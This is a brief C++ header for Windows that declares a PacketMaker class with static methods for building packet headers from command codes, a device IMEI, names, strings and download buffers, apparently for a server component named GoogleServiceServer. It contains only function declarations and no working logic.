#pragma once

#include <windows.h>

#include <iostream>
#include "GoogleServiceServer.h"

using namespace std;


class PacketMaker {
public:
	static int PacketMaker::hdr(char szData[], int cmd, char * imei);
	static int PacketMaker::hdrWithValue(char szData[], int cmd, char * imei, int value);
	static int PacketMaker::hdrWithName(char lphdr[], int cmd, char * imei, char * name);
	static int hdrWithNameAndSize(char lphdr[], int cmd, char * imei, char * name, int datasize);

	static int hdrWithStringString(char szData[], int cmd, char * imei, char * str1, char *str2);
	static int hdrWithStringStringData(char *lpDownloadSendBuf, char * imei, int cmd, char  classfunc[2][MAX_MESSAGE_SIZE], int dwFileSize);

	static int hdrWithStringStringString(char *lpDownloadSendBuf, char * imei, int cmd, char  classfunc[3][MAX_MESSAGE_SIZE]);
};